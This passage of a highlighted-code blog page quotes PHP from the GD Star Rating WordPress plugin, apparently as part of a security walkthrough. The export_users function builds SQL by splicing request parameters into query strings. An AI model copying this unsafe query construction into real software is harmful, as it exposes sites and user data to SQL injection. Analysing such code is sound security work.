class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"de"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"t2"</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">export_name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'t2'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"t2full"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">export_name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'t2_full'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-23">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">switch</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">export_type</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"user"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">values</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"us"</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"min"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"nor"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"de"</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"article"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"comment"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-27">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e">get_data </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">key</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">value</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">values</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">in_array</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">value</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">values</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">"invalid_request"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-s">"ex"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">value</span><span class="crayon-h"> </span><span class="crayon-o">!==</span><span class="crayon-h"> </span><span class="crayon-s">"on"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">"invalid_request"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-39">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-type: text/csv'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Disposition: attachment; filename="gdsr_export_'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">export_name</span><span class="crayon-sy">.</span><span class="crayon-s">'.csv"'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">GDSRExport</span><span class="crayon-o">::</span><span class="crayon-e">export_users</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"us"</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"de"</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">get_data</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">rows</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ARRAY_N</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">count</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">rows</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e">rows </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">row</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'"'</span><span class="crayon-sy">.</span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-s">'", "'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">row</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">'"'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\r\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e7aa7785415683159-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7785415683159-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0147 seconds] -->
<p>It calls into <a href="http://plugins.svn.wordpress.org/gd-star-rating/trunk/code/cls/export.php">/cls/export.php</a>s export_users function:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa7798657815099" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function export_users($user_data = "min", $data_export = "article", $get_data = array()) {
    global $table_prefix;
    $columns = array();
    $select = array();
    $where = array();
    $tables = array();

    $tables[] = $table_prefix."gdsr_votes_log v";
    $tables[] = $table_prefix."users u";
    $tables[] = $table_prefix."posts p";
    $where[] = "v.vote_type = ''".$data_export."''";
    $where[] = "v.user_id = u.id";
    
    switch ($user_data) {
        case "min":
            $select[] = "u.id as user_id";
            $columns[] = "user_id";
            break;
        case "nor":
            $select[] = "u.id as user_id";
            $select[] = "u.display_name";
            $select[] = "u.user_email";
            $columns[] = "user_id";
            $columns[] = "user_name";
            $columns[] = "user_email";
            break;
    }
    
    $select[] = "p.id";
    $columns[] = "post_id";
    
    if ($get_data["pt"] == "on") {
        $select[] = "p.post_title";
        $columns[] = "post_title";
    }
    if ($get_data["pd"] == "on") {
        $select[] = "p.post_date";
        $columns[] = "post_date";
    }
    switch ($data_export) {
        case "article":
            $where[] = "v.id = p.id";
            break;
        case "comment":
            $select[] = "c.comment_id";
            $columns[] = "comment_id";
            $tables[] = $table_prefix."comments c";
            $where[] = "v.id = c.comment_id";
            $where[] = "p.id = c.comment_post_id";
            if ($get_data["ca"] == "on") {
                $select[] = "c.comment_author";
                $columns[] = "comment_author";
            }
            if ($get_data["cd"] == "on") {
                $select[] = "c.comment_date";
                $columns[] = "comment_date";
            }
            break;
    }        
    
    $select[] = "v.vote";
    $select[] = "v.voted";
    $columns[] = "vote";
    $columns[] = "vote_date";
    
    if ($get_data["ip"] == "on") {
        $select[] = "v.ip";
        $columns[] = "ip";
    }
    if ($get_data["ua"] == "on") {
        $select[] = "v.user_agent";
        $columns[] = "user_agent";
    }
    
    echo join(", ", $columns)."\r\n";
    $j_select = join(", ", $select);
    $j_where = join(" and ", $where);
    $j_tables = join(", ", $tables);
    
    return sprintf("select %s from %s where %s order by u.id", $j_select, $j_tables, $j_where);
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-10">10</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-12">12</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-14">14</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-16">16</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-18">18</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-20">20</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-22">22</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-24">24</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-26">26</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-28">28</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-30">30</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-32">32</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-34">34</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-36">36</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-38">38</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-40">40</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-42">42</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-44">44</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-46">46</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-48">48</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-50">50</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-52">52</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-54">54</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-56">56</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-58">58</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-60">60</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-62">62</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-64">64</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-66">66</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-68">68</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-70">70</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-72">72</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-74">74</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-76">76</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-77">77</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-78">78</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-79">79</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa7798657815099-80">80</div><div class="crayon-num" data-line="crayon-53c98e7aa7798657815099-81">81</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa7798657815099-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">export_users</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">user_data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"min"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">data_export</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"article"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">get_data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">table_prefix</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">columns</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">select</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa7798657815099-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">where</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa7798657815099-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tables</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span 